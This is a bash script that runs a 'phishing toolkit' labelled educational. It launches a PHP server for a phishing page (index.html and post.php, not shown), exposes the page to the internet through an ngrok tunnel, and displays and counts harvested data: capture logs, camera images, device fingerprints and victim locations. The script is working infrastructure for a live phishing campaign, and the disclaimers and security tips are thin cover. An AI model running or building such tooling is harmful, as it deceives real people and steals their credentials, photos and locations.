#!/bin/bash

# Phishing Toolkit Management Script
# For educational security testing only

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
TOOLKIT_DIR="$HOME/phishing-toolkit"
LOG_DIR="$TOOLKIT_DIR/logs"
PORT="8080"
SERVER_PID_FILE="/tmp/phish_server.pid"
NGROK_PID_FILE="/tmp/phish_ngrok.pid"

# Banner
show_banner() {
    clear
    echo -e "${BLUE}"
    echo '╔══════════════════════════════════════╗'
    echo '║     Phishing Security Toolkit        ║'
    echo '║        Educational Purpose Only      ║'
    echo '╚══════════════════════════════════════╝'
    echo -e "${NC}"
}

# Check dependencies
check_deps() {
    echo -e "${YELLOW}[*] Checking dependencies...${NC}"
    
    # Check PHP
    if ! command -v php &> /dev/null; then
        echo -e "${RED}[!] PHP is not installed${NC}"
        echo "Install with: sudo apt install php -y"
        exit 1
    fi
    
    # Check if ngrok is installed (optional)
    if command -v ngrok &> /dev/null; then
        NGROK_AVAILABLE=true
        echo -e "${GREEN}[✓] ngrok found${NC}"
    else
        NGROK_AVAILABLE=false
        echo -e "${YELLOW}[!] ngrok not found (optional for tunneling)${NC}"
    fi
    
    echo -e "${GREEN}[✓] Dependencies OK${NC}"
}

# Setup toolkit structure
setup_toolkit() {
    echo -e "${YELLOW}[*] Setting up toolkit structure...${NC}"
    
    # Create directories
    mkdir -p "$TOOLKIT_DIR"
    mkdir -p "$LOG_DIR/captures"
    mkdir -p "$LOG_DIR/reports"
    
    # Check if files exist
    if [[ ! -f "$TOOLKIT_DIR/index.html" ]]; then
        echo -e "${YELLOW}[!] index.html not found. Please place it in $TOOLKIT_DIR${NC}"
        read -p "Copy index.html now? (y/n): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            read -p "Enter path to index.html: " html_path
            if [[ -f "$html_path" ]]; then
                cp "$html_path" "$TOOLKIT_DIR/index.html"
                echo -e "${GREEN}[✓] index.html copied${NC}"
            else
                echo -e "${RED}[!] File not found${NC}"
            fi
        fi
    fi
    
    if [[ ! -f "$TOOLKIT_DIR/post.php" ]]; then
        echo -e "${YELLOW}[!] post.php not found. Creating default...${NC}"
        # Here you'd paste the PHP code above
        echo -e "${RED}[!] Please create post.php manually with the provided code${NC}"
    fi
    
    echo -e "${GREEN}[✓] Toolkit structure ready${NC}"
}

# Start PHP server
start_server() {
    echo -e "${YELLOW}[*] Starting PHP server...${NC}"
    
    # Check if already running
    if [[ -f "$SERVER_PID_FILE" ]]; then
        pid=$(cat "$SERVER_PID_FILE")
        if ps -p $pid > /dev/null 2>&1; then
            echo -e "${RED}[!] Server already running (PID: $pid)${NC}"
            return 1
        fi
    fi
    
    # Start PHP server
    cd "$TOOLKIT_DIR"
    php -S 0.0.0.0:$PORT > "$LOG_DIR/server.log" 2>&1 &
    echo $! > "$SERVER_PID_FILE"
    
    sleep 2
    
    # Check if started
    if ps -p $(cat "$SERVER_PID_FILE") > /dev/null 2>&1; then
        echo -e "${GREEN}[✓] Server started on port $PORT${NC}"
        echo -e "${GREEN}[✓] Local URL: http://localhost:$PORT${NC}"
        
        # Get local IP
        local_ip=$(hostname -I | awk '{print $1}')
        echo -e "${GREEN}[✓] Network URL: http://$local_ip:$PORT${NC}"
    else
        echo -e "${RED}[!] Failed to start server${NC}"
        return 1
    fi
}

# Start ngrok tunnel
start_ngrok() {
    if [[ "$NGROK_AVAILABLE" != "true" ]]; then
        echo -e "${RED}[!] ngrok not available${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Starting ngrok tunnel...${NC}"
    
    # Check if already running
    if [[ -f "$NGROK_PID_FILE" ]]; then
        pid=$(cat "$NGROK_PID_FILE")
        if ps -p $pid > /dev/null 2>&1; then
            echo -e "${RED}[!] ngrok already running (PID: $pid)${NC}"
            return 1
        fi
    fi
    
    # Start ngrok
    ngrok http $PORT > "$LOG_DIR/ngrok.log" 2>&1 &
    echo $! > "$NGROK_PID_FILE"
    
    sleep 3
    
    # Get ngrok URL
    if command -v curl &> /dev/null; then
        ngrok_url=$(curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"https://[^"]*' | cut -d'"' -f4)
        if [[ -n "$ngrok_url" ]]; then
            echo -e "${GREEN}[✓] ngrok URL: $ngrok_url${NC}"
        else
            echo -e "${YELLOW}[!] Check ngrok URL at http://localhost:4040${NC}"
        fi
    fi
}

# Stop all services
stop_services() {
    echo -e "${YELLOW}[*] Stopping services...${NC}"
    
    # Stop PHP server
    if [[ -f "$SERVER_PID_FILE" ]]; then
        pid=$(cat "$SERVER_PID_FILE")
        if ps -p $pid > /dev/null 2>&1; then
            kill $pid
            echo -e "${GREEN}[✓] Stopped PHP server (PID: $pid)${NC}"
        fi
        rm "$SERVER_PID_FILE"
    fi
    
    # Stop ngrok
    if [[ -f "$NGROK_PID_FILE" ]]; then
        pid=$(cat "$NGROK_PID_FILE")
        if ps -p $pid > /dev/null 2>&1; then
            kill $pid
            echo -e "${GREEN}[✓] Stopped ngrok (PID: $pid)${NC}"
        fi
        rm "$NGROK_PID_FILE"
    fi
}

# Show captured data
show_data() {
    echo -e "${YELLOW}[*] Recent captured data:${NC}"
    
    if [[ -d "$LOG_DIR" ]]; then
        echo -e "${BLUE}=== Latest Captures ===${NC}"
        tail -n 10 "$LOG_DIR/captures_"* 2>/dev/null | head -20
        
        echo -e "\n${BLUE}=== Total Statistics ===${NC}"
        
        # Count captures
        capture_count=$(ls -1 "$LOG_DIR/captures_"* 2>/dev/null | wc -l)
        echo -e "Capture logs: $capture_count"
        
        # Count images
        image_count=$(ls -1 "$LOG_DIR/captures/"*.jpg 2>/dev/null | wc -l)
        echo -e "Images captured: $image_count"
        
        # Count visitors
        if [[ -f "$LOG_DIR/visitors_"* ]]; then
            visitor_count=$(cat "$LOG_DIR/visitors_"* 2>/dev/null | wc -l)
            echo -e "Total visitors: $visitor_count"
        fi
    else
        echo -e "${RED}[!] No data found${NC}"
    fi
}

# Generate report
generate_report() {
    echo -e "${YELLOW}[*] Generating security test report...${NC}"
    
    report_file="$LOG_DIR/reports/report_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "PHISHING SECURITY TEST REPORT"
        echo "Generated: $(date)"
        echo "================================"
        echo ""
        
        echo "TEST INFORMATION"
        echo "----------------"
        echo "Toolkit directory: $TOOLKIT_DIR"
        echo "Test duration: $([ -f "$LOG_DIR/server.log" ] && stat -c %y "$LOG_DIR/server.log")"
        echo ""
        
        echo "COLLECTED DATA SUMMARY"
        echo "---------------------"
        echo "Total visitors: $(cat "$LOG_DIR/visitors_"* 2>/dev/null | wc -l)"
        echo "Total captures: $(ls -1 "$LOG_DIR/captures_"* 2>/dev/null | wc -l)"
        echo "Images saved: $(ls -1 "$LOG_DIR/captures/"*.jpg 2>/dev/null | wc -l)"
        echo "Device fingerprints: $(cat "$LOG_DIR/devices_"* 2>/dev/null | wc -l)"
        echo "Location data points: $(cat "$LOG_DIR/locations_"* 2>/dev/null | wc -l)"
        echo ""
        
        echo "RECOMMENDATIONS"
        echo "---------------"
        echo "1. Always use MFA (Multi-Factor Authentication)"
        echo "2. Verify website URLs before entering credentials"
        echo "3. Be cautious of unexpected reward offers"
        echo "4. Check for HTTPS and valid certificates"
        echo "5. Never allow camera access to untrusted sites"
        echo "6. Keep browsers and security software updated"
        echo "7. Use ad-blockers and anti-phishing extensions"
        
    } > "$report_file"
    
    echo -e "${GREEN}[✓] Report generated: $report_file${NC}"
}

# Clean up old data
clean_data() {
    echo -e "${YELLOW}[*] Cleaning old data...${NC}"
    
    read -p "Delete all captured data? (y/n): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        rm -rf "$LOG_DIR"/*
        mkdir -p "$LOG_DIR/captures" "$LOG_DIR/reports"
        echo -e "${GREEN}[✓] Data cleaned${NC}"
    else
        echo -e "${YELLOW}[!] Clean cancelled${NC}"
    fi
}

# Interactive menu
show_menu() {
    echo -e "\n${BLUE}=== Toolkit Menu ===${NC}"
    echo "1) Start Server"
    echo "2) Start ngrok Tunnel (if available)"
    echo "3) Show Captured Data"
    echo "4) Generate Report"
    echo "5) Stop All Services"
    echo "6) Clean Data"
    echo "7) Exit"
    echo -n -e "${YELLOW}Select option: ${NC}"
}

# Main execution
main() {
    show_banner
    check_deps
    
    # Setup if first run
    if [[ ! -d "$TOOLKIT_DIR" ]]; then
        setup_toolkit
    fi
    
    # Check if files exist
    if [[ ! -f "$TOOLKIT_DIR/index.html" ]] || [[ ! -f "$TOOLKIT_DIR/post.php" ]]; then
        echo -e "${RED}[!] Missing required files in $TOOLKIT_DIR${NC}"
        echo "Please ensure both index.html and post.php are present"
        setup_toolkit
    fi
    
    while true; do
        show_menu
        read choice
        
        case $choice in
            1)
                start_server
                ;;
            2)
                start_ngrok
                ;;
            3)
                show_data
                ;;
            4)
                generate_report
                ;;
            5)
                stop_services
                ;;
            6)
                clean_data
                ;;
            7)
                echo -e "${YELLOW}[*] Exiting...${NC}"
                stop_services
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
        
        echo -e "\n${YELLOW}Press Enter to continue...${NC}"
        read
    done
}

# Trap Ctrl+C
trap 'echo -e "\n${RED}[!] Interrupted${NC}"; stop_services; exit 1' INT

# Run main function
main "$@"
